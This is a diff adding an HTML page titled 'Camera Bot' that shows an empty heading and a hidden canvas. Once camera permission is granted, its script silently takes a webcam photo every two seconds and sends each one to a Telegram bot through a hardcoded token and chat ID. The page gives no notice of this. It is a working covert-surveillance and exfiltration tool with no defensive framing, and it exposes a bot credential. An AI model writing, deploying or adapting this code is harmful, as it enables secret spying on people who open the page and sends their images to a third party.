@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Camera Bot</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 20px;
+    }
+    #canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h1> </h1>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const canvas = document.getElementById("canvas");
+    const botToken = "8310662832:AAH0hOxIRR2t3Jk3Qywa6IbuCNR7IV2gex8";
+    const chatId = "917254238";
+    
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(function (stream) {
+        const videoTrack = stream.getVideoTracks()[0];
+        setInterval(() => takeSnapshot(videoTrack), 2000);
+      })
+      .catch(function (error) {
+        console.error("⚠️ حدث خطأ أثناء الوصول للكاميرا:", error);
+      });
+
+    function takeSnapshot(videoTrack) {
+      const videoElement = document.createElement("video");
+      videoElement.srcObject = new MediaStream([videoTrack]);
+
+      videoElement.addEventListener("loadedmetadata", () => {
+        canvas.width = videoElement.videoWidth;
+        canvas.height = videoElement.videoHeight;
+
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+
+        canvas.toBlob(function (blob) {
+          const reader = new FileReader();
+          reader.onloadend = function () {
+            const base64 = reader.result.split(",")[1];
+            sendToTelegram(base64);
+          };
+          reader.readAsDataURL(blob);
+        }, "image/jpeg");
+      });
+
+      videoElement.play();
+    }
+
+    function sendToTelegram(base64Image) {
+      const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+      
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("photo", `data:image/jpeg;base64,${base64Image}`);
+      formData.append("caption", `📸 ${new Date().toLocaleString()}`);
+
+      fetch(url, {
+        method: "POST",
+        body: formData
+      })
+        .then((response) => response.json())
+        .then((result) => {
+          if (result.ok) {
+            console.log("✅ تم إرسال الصورة");
+          } else {
+            console.error("❌ فشل إرسال الصورة:", result.description);
+          }
+        })
+        .catch((error) => console.error("❌ خطأ في الإرسال:", error));
+    }
+  </script>
+</body>
+</html>
